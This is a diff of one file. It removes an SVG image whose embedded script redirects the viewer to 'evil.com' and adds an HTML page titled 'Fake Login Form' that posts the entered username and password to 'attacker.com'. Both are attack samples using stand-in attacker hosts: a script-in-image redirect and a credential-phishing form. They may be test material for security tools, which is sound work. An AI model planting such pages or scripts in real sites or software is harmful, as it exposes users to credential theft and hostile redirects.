@@ -1,9 +1,20 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-  <script type="text/javascript">
-    document.location = 'https://evil.com'
-  </script>
-</svg>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Login Form</title>
+</head>
+<body>
+    <h1>Login</h1>
+    <form action="http://attacker.com/login" method="POST">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" placeholder="Username" required>
+        <br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <br><br>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
